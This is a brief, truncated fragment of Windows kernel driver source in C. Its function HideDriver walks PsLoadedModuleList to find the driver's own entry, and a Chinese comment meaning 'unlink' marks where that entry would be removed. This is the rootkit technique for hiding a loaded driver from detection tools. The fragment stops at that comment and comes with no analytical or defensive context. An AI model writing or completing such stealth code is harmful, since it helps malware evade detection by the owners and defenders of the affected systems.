void HideDriver(PDRIVER_OBJECT pDrv) {
    PLIST_ENTRY head = &PsLoadedModuleList;
    PLIST_ENTRY cur  = head->Flink;
    while (cur != head) {
        PLDR_DATA_TABLE_ENTRY e = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (e->DllBase == pDrv->DriverStart) {
            // 摘链
